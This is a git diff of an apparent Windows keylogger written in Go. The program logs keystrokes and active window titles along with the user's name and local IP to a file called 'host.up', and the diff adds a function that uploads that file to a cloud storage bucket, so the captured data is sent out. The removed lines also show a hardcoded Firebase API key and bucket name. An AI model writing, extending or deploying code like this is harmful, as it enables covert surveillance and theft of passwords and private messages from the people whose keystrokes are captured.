@@ -17,12 +17,13 @@ import (
 	"time"
 	"unsafe"
 
+	"cloud.google.com/go/storage"
 	firebase "firebase.google.com/go"
 	"github.com/gios/amigo/constants"
 	"google.golang.org/api/option"
 )
 
-const logFile = "host.up"
+const destinationFile = "host.up"
 
 var (
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -43,6 +44,9 @@ var (
 	tmpTitle       string
 	eventsBuf      string
 	systemInfoData systemInfo
+	bucketHandler  *storage.BucketHandle
+	tmpKeylog      = make(chan string)
+	tmpWindow      = make(chan string)
 )
 
 type systemInfo struct {
@@ -51,9 +55,6 @@ type systemInfo struct {
 	userUsername string
 	localIP      net.IP
 }
-
-var tmpKeylog = make(chan string)
-var tmpWindow = make(chan string)
 
 func (si *systemInfo) String() string {
 	return time.Now().Format("2006-01-02 15:04:05") + " " + "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
@@ -193,9 +194,9 @@ func fileInterval() {
 func writeLogFile(data string) {
 	cwd, GetwdErr := os.Getwd()
 	if GetwdErr != nil {
-		log.Panicf("setLogOutput -> %v", GetwdErr)
+		log.Panicf("cwd -> %v", GetwdErr)
 	}
-	file, openFileErr := os.OpenFile(cwd+"\\"+logFile, os.O_APPEND|os.O_WRONLY, 0777)
+	file, openFileErr := os.OpenFile(cwd+"\\"+destinationFile, os.O_APPEND|os.O_WRONLY, 0777)
 	if openFileErr != nil {
 		log.Panicf("writeLogFile -> %v", openFileErr)
 	}
@@ -210,10 +211,10 @@ func writeLogFile(data string) {
 func createLogFile() {
 	cwd, GetwdErr := os.Getwd()
 	if GetwdErr != nil {
-		log.Panicf("setLogOutput -> %v", GetwdErr)
+		log.Panicf("cwd -> %v", GetwdErr)
 	}
-	log.Printf("create -> %v", cwd+"\\"+logFile)
-	file, createErr := os.Create(cwd + "\\" + logFile)
+	log.Printf("create -> %v", cwd+"\\"+destinationFile)
+	file, createErr := os.Create(cwd + "\\" + destinationFile)
 	if createErr != nil {
 		log.Panicf("createLogFile -> %v", createErr)
 	}
@@ -459,9 +460,9 @@ func copy(src, dst string) error {
 
 func initFirebase() {
 	config := &firebase.Config{
-		StorageBucket: "amigo-61499.appspot.com",
+		StorageBucket: "",
 	}
-	opt := option.WithAPIKey("AIzaSyC6pEmNFVRWTh-KsDi30jDEWgQZQKYupmA")
+	opt := option.WithCredentialsFile("test.json") // TODO: DO THIS VIA METHOD NOT FILE
 	app, err := firebase.NewApp(context.Background(), config, opt)
 	if err != nil {
 		log.Panicf("newApp -> %v", err)
@@ -476,14 +477,33 @@ func initFirebase() {
 	if err != nil {
 		log.Panicf("bucket -> %v", err)
 	}
-	// TODO: UPLOAD FILE
+	bucketHandler = bucket
+}
+
+func writeToBucket() {
+	objWriter := bucketHandler.Object("test.txt").NewWriter(context.Background())
+	defer objWriter.Close()
+
+	cwd, GetwdErr := os.Getwd()
+	if GetwdErr != nil {
+		log.Panicf("cwd -> %v", GetwdErr)
+	}
+	destinationFileReader, openErr := os.Open(cwd + "\\" + destinationFile)
+	if openErr != nil {
+		log.Panicf("open -> %v", openErr)
+	}
+	defer destinationFileReader.Close()
+
+	if _, copyErr := io.Copy(objWriter, destinationFileReader); copyErr != nil {
+		log.Panicf("copy -> %v", copyErr)
+	}
 }
 
 func main() {
 	log.Println("Starting...")
 	cwd, GetwdErr := os.Getwd()
 	if GetwdErr != nil {
-		log.Panicf("setLogOutput -> %v", GetwdErr)
+		log.Panicf("cwd -> %v", GetwdErr)
 	}
 	f, err := os.OpenFile(cwd+"\\"+"debug.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
 	if err != nil {
@@ -495,6 +515,8 @@ func main() {
 	getSystemInfo()
 	createLogFile()
 	addScheduler()
+	initFirebase()
+	// writeToBucket()
 	go fileInterval()
 	go keyLogger()
 	go windowLogger()
